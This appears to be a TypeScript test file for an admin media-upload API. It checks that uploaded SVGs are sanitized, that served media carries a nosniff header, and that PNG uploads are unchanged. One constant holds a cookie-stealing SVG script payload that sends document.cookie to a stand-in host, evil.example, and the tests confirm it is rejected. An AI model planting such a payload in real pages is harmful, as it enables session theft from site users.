import { describe, it, expect } from "vitest";
import { Hono } from "hono";
import admin from "../src/admin/router";
import media, { MEDIA_CACHE_CONTROL } from "../src/media";
import type { Env } from "../src/env";

// Round-4 P5c — B-2 10F closure: the GENERIC media upload
// (admin/media-crud-handlers.ts POST /api/admin/media/upload) now runs
// through the SAME shared sanitizeSvgUpload gate (lib/svg-sanitizer.ts) as
// the brand-logo endpoint (test/leadgen-p5c-assets.test.ts), so an SVG
// uploaded through EITHER route is sanitized — not just one. Plus:
// GET /media/<key> now carries X-Content-Type-Options: nosniff on every
// response (defense-in-depth).
//
// NOTE: this is the coordinator-granted expansion of the P5c slice, distinct
// from the pre-existing test/admin-media-site-filter.test.ts and
// test/media.test.ts suites (left untouched — this file only ADDS new,
// P5c-scoped coverage of the security closure).

interface PreparedCall {
  sql: string;
  binds: unknown[];
}
function makeFakeDb() {
  const calls: PreparedCall[] = [];
  let nextId = 1;
  const db = {
    prepare(sql: string) {
      let captured: unknown[] = [];
      const stmt = {
        bind(...args: unknown[]) {
          captured = args;
          return stmt;
        },
        async first<T = unknown>(): Promise<T | null> {
          calls.push({ sql, binds: captured });
          if (sql.includes("FROM sites")) return null; // no site scoping exercised here
          if (sql.startsWith("INSERT INTO media")) {
            // MEDIA_COLUMNS shape: id, site_id, filename, storage_key,
            // mime_type, size_bytes, width, height, alt_text, caption,
            // folder, uploaded_by, created_at, updated_at.
            return {
              id: nextId++,
              site_id: captured[0] ?? null,
              filename: captured[1],
              storage_key: captured[2],
              mime_type: captured[3],
              size_bytes: captured[4],
              width: captured[5] ?? null,
              height: captured[6] ?? null,
              alt_text: captured[7] ?? null,
              caption: captured[8] ?? null,
              folder: captured[9] ?? null,
              uploaded_by: captured[10] ?? null,
              created_at: 0,
              updated_at: null,
            } as unknown as T;
          }
          return null;
        },
        async run() {
          calls.push({ sql, binds: captured });
          return { success: true, meta: {} };
        },
        async all<T = unknown>() {
          calls.push({ sql, binds: captured });
          return { results: [] as T[], success: true, meta: {} };
        },
      };
      return stmt;
    },
  } as unknown as D1Database;
  return { db, calls };
}

interface RecordedPut {
  key: string;
  value: ArrayBuffer;
  options: { httpMetadata?: { contentType?: string } } | undefined;
}
function makeFakeMedia() {
  const store = new Map<string, { body: Uint8Array; httpEtag: string; httpMetadata?: { contentType?: string } }>();
  const puts: RecordedPut[] = [];
  const bucket = {
    async get(key: string, opts?: { onlyIf?: { etagDoesNotMatch?: string } }) {
      const e = store.get(key);
      if (!e) return null;
      const meta = { httpEtag: e.httpEtag, size: e.body.byteLength, httpMetadata: e.httpMetadata ?? {} };
      // Mirrors R2's conditional-GET contract (test/media.test.ts's reference
      // mock): a matching If-None-Match returns the metadata WITHOUT a body,
      // which serve.ts translates to a 304.
      if (opts?.onlyIf?.etagDoesNotMatch === e.httpEtag) return meta;
      return {
        ...meta,
        body: new ReadableStream<Uint8Array>({
          start(c) {
            c.enqueue(e.body);
            c.close();
          },
        }),
      };
    },
    async put(key: string, value: ArrayBuffer, options?: { httpMetadata?: { contentType?: string } }) {
      puts.push({ key, value, options });
      const bytes =
        value instanceof ArrayBuffer ? new Uint8Array(value) : new Uint8Array(await new Response(value as never).arrayBuffer());
      store.set(key, { body: bytes, httpEtag: `etag-${key}`, httpMetadata: options?.httpMetadata });
      return null;
    },
  };
  return { bucket: bucket as unknown as R2Bucket, puts, store };
}

function buildEnv(db: D1Database, mediaBucket: R2Bucket, overrides: Partial<Env> = {}): Env {
  return {
    DB: db,
    CACHE: {} as KVNamespace,
    MEDIA: mediaBucket,
    APP_ENV: "development",
    ADMIN_HOST: "localhost",
    ADMIN_BASE_URL: "http://localhost:8787",
    ADMIN_BASE_PATH: "/admin",
    CACHE_API_ENABLED: "false",
    HTML_CACHE_TTL_SECONDS: "60",
    OPENAI_TEXT_MODEL: "gpt-5.5",
    OPENAI_IMAGE_MODEL: "gpt-image-2",
    SITE_PROVISIONING_DRY_RUN: "true",
    SITE_PROVISIONING_ALLOW_ROUTE_MUTATION: "false",
    DEV_BYPASS_AUTH: "true",
    ...overrides,
  } as Env;
}

const GENERIC_UPLOAD_URL = "/api/admin/media/upload";
const XMLNS = 'xmlns="http://www.w3.org/2000/svg"';
const MALICIOUS_SVG = `<svg ${XMLNS}><script>fetch('https://evil.example/'+document.cookie)</script></svg>`;
const MESSY_VALID_SVG =
  `<?xml version="1.0"?><!-- brand mark --><svg viewBox="0 0 10 10">` +
  `<rect width="10" height="10" fill="#123456"/></svg>`;

function multipart(fields: { file: File }): RequestInit {
  const fd = new FormData();
  fd.set("file", fields.file);
  return { method: "POST", body: fd };
}

describe("B-2 10F closure — generic media upload sanitizes SVG (shares the brand-logo gate)", () => {
  it("rejects the malicious <script> SVG with a plain-language 400 and stores NOTHING", async () => {
    const { db, calls } = makeFakeDb();
    const { bucket, puts } = makeFakeMedia();
    const res = await admin.request(
      GENERIC_UPLOAD_URL,
      multipart({ file: new File([MALICIOUS_SVG], "evil.svg", { type: "image/svg+xml" }) }),
      buildEnv(db, bucket),
    );
    expect(res.status).toBe(400);
    const body = (await res.json()) as { error: string; code: string };
    expect(body.code).toBe("svg_rejected");
    expect(body.error).toMatch(/disallowed element: script/i);
    // Nothing written to R2 or D1 for a rejected upload.
    expect(puts).toHaveLength(0);
    expect(calls.filter((c) => c.sql.startsWith("INSERT INTO media"))).toHaveLength(0);
  });

  it("accepts a valid-but-messy SVG and stores the SANITIZED bytes (comment/PI stripped, size_bytes = sanitized length)", async () => {
    const { db, calls } = makeFakeDb();
    const { bucket, puts } = makeFakeMedia();
    const res = await admin.request(
      GENERIC_UPLOAD_URL,
      multipart({ file: new File([MESSY_VALID_SVG], "brand.svg", { type: "image/svg+xml" }) }),
      buildEnv(db, bucket),
    );
    expect(res.status).toBe(201);
    const body = (await res.json()) as { item: { size_bytes: number; mime_type: string }; url: string };
    expect(body.item.mime_type).toBe("image/svg+xml");
    // Stored bytes are the RE-SERIALIZED (sanitized) markup, not the original.
    expect(puts).toHaveLength(1);
    const stored = new TextDecoder().decode(puts[0]!.value);
    expect(stored).not.toContain("<!--");
    expect(stored).not.toContain("<?xml");
    expect(stored).toContain('xmlns="http://www.w3.org/2000/svg"');
    // size_bytes in the DB row reflects the SANITIZED length (may legitimately
    // differ from the original upload's byte count).
    expect(body.item.size_bytes).toBe(puts[0]!.value.byteLength);
    expect(body.item.size_bytes).not.toBe(MESSY_VALID_SVG.length);
    const ins = calls.find((c) => c.sql.startsWith("INSERT INTO media"));
    expect(ins!.binds[4]).toBe(body.item.size_bytes); // size_bytes bind position
  });

  it("a raster PNG upload is completely unaffected (regression: existing path unchanged)", async () => {
    const { db } = makeFakeDb();
    const { bucket, puts } = makeFakeMedia();
    const bytes = Buffer.from("\x89PNG\r\n\x1a\n rest-of-a-png");
    const res = await admin.request(
      GENERIC_UPLOAD_URL,
      multipart({ file: new File([bytes], "logo.png", { type: "image/png" }) }),
      buildEnv(db, bucket),
    );
    expect(res.status).toBe(201);
    const body = (await res.json()) as { item: { size_bytes: number; mime_type: string } };
    expect(body.item.mime_type).toBe("image/png");
    expect(body.item.size_bytes).toBe(bytes.byteLength);
    expect(puts).toHaveLength(1);
    expect(puts[0]!.value.byteLength).toBe(bytes.byteLength);
  });

  it("a sanitized upload is served back with the sanitized content (round-trip through the real serve route)", async () => {
    const { db } = makeFakeDb();
    const { bucket } = makeFakeMedia();
    const env = buildEnv(db, bucket);
    const upRes = await admin.request(
      GENERIC_UPLOAD_URL,
      multipart({ file: new File([MESSY_VALID_SVG], "brand.svg", { type: "image/svg+xml" }) }),
      env,
    );
    const upBody = (await upRes.json()) as { item: { storage_key: string } };
    const app = new Hono<{ Bindings: Env }>().route("/", media);
    const getRes = await app.request(`/media/${upBody.item.storage_key}`, { method: "GET" }, env);
    expect(getRes.status).toBe(200);
    const served = await getRes.text();
    expect(served).not.toContain("<!--");
    expect(served).not.toContain("<?xml");
  });
});

describe("B-2 10F defense-in-depth — GET /media/<key> carries X-Content-Type-Options: nosniff", () => {
  it("nosniff is present on a normal 200 response, alongside the existing ETag/Cache-Control contract", async () => {
    const { bucket, store } = makeFakeMedia();
    store.set("foo.svg", {
      body: new TextEncoder().encode(`<svg ${XMLNS}><rect width="1" height="1"/></svg>`),
      httpEtag: "abc123",
      httpMetadata: { contentType: "image/svg+xml" },
    });
    const env = buildEnv(makeFakeDb().db, bucket);
    const app = new Hono<{ Bindings: Env }>().route("/", media);
    const res = await app.request("/media/foo.svg", { method: "GET" }, env);
    expect(res.status).toBe(200);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    // The pre-existing contract is untouched by adding nosniff.
    expect(res.headers.get("etag")).toBe("abc123");
    expect(res.headers.get("cache-control")).toBe(MEDIA_CACHE_CONTROL);
    expect(res.headers.get("content-type")).toBe("image/svg+xml");
  });

  it("nosniff is present on a 304 Not Modified response too", async () => {
    const { bucket, store } = makeFakeMedia();
    store.set("cached.png", {
      body: new TextEncoder().encode("X"),
      httpEtag: "v1",
      httpMetadata: { contentType: "image/png" },
    });
    const env = buildEnv(makeFakeDb().db, bucket);
    const app = new Hono<{ Bindings: Env }>().route("/", media);
    const res = await app.request("/media/cached.png", { method: "GET", headers: { "if-none-match": '"v1"' } }, env);
    expect(res.status).toBe(304);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("nosniff is present even on a 404 fallback response's sibling 200 (sanity: header applies to real assets)", async () => {
    const { bucket, store } = makeFakeMedia();
    store.set("blob.bin", { body: new Uint8Array(4), httpEtag: "def456" });
    const env = buildEnv(makeFakeDb().db, bucket);
    const app = new Hono<{ Bindings: Env }>().route("/", media);
    const res = await app.request("/media/blob.bin", { method: "GET" }, env);
    expect(res.status).toBe(200);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-type")).toBe("application/octet-stream");
  });
});
